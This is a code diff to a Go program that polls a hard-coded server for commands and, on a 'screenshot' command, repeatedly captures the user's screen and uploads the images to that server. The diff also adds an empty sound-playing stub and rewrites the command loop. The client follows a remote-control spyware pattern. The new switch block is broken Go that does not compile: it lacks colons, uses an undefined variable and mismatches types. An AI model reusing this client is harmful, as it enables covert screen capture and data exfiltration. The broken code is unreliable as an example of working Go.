@@ -7,11 +7,13 @@ import (
 	"net/http"
 	"os"
 	"time"
-
+	"strings"
+	"github.com/ebitengine/oto/v3"
+    "github.com/hajimehoshi/go-mp3"
 	"github.com/vova616/screenshot"
 )
 
-var serverIp string = "http://10.0.2.2:10000"
+var serverIp string = "http://127.0.0.1:10000"
 var userInput string = ""
 
 func ss() {
@@ -80,12 +82,17 @@ func fetchCommand() string {
 	return string(bodyBytes)
 }
 
+// command to play sounds the server defines built for mp3
+func playSound() {
+
+}
+
 func main() {
 	for true {
 		userInput = fetchCommand()
 		time.Sleep(2 * time.Second)
 		fmt.Printf("Received command from server: %s\n", userInput)
-		if userInput != "idle" {
+		/* if userInput != "idle" {
 			if userInput == "screenshot" {
 				index := 1
 				for index < 12 {
@@ -100,6 +107,23 @@ func main() {
 			// if userInput == start
 		} else {
 			time.Sleep(5 * time.Second)
+		}
+		*/
+		switch userInput[0] {
+		
+			case "idle"
+			time.Sleep(5 * time.Second)
+
+			case "screenshot"
+			for index < userInput[1:] {
+				ss()
+				output := sendFile("./ss.webp", "image")
+				fmt.Println(output)
+				time.Sleep(500 * time.Millisecond)
+				fmt.Println(index)
+				index++
+			}
+
 		}
 	}
 }
